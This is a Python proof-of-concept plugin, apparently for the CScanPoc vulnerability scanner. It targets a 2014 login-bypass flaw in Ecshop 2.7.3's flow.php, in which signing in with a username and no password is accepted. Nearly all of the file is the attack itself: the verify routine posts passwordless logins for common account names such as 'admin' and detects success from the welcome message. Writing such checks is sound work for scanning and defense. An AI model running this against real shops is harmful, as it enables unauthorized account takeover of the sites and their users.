# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import http.cookiejar


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0004_p'  # 平台漏洞编号，留空
    name = 'Ecshop 2.7.3 /flow.php 登录绕过漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-09-03'  # 漏洞公布时间
    desc = '''
        登录操作最终执行check_user方法，当用户密码为null时，只判断用户名。
        而在flow.php中并没有对密码进行判断或者初始化。可以只通过账号就可以实现登录。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=063655'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '23635a7a-698b-4c03-9b66-b5d4eb9af206'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            username_list = ['admin', 'ecshop', 'vip', 'test', '123456']
            for username in username_list:
                test = "您好，<b class=\"username\">"+username+"</b>，欢迎您回来！"
                cj = http.cookiejar.LWPCookieJar()
                opener = urllib.request.build_opener(
                    urllib.request.HTTPCookieProcessor(cj))
                urllib.request.install_opener(opener)
                # request
                verify_url = '{target}'.format(
                    target=self.target)+'/flow.php?step=login'
                postdata = urllib.parse.urlencode({
                    'act': 'signin',
                    'username': username
                })
                req = urllib.request.Request(
                    url=verify_url,
                    data=postdata,
                )
                content = urllib.request.urlopen(req).read()
                if urllib.request.urlopen(req).geturl() == self.target + "/index.php":
                    if test in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
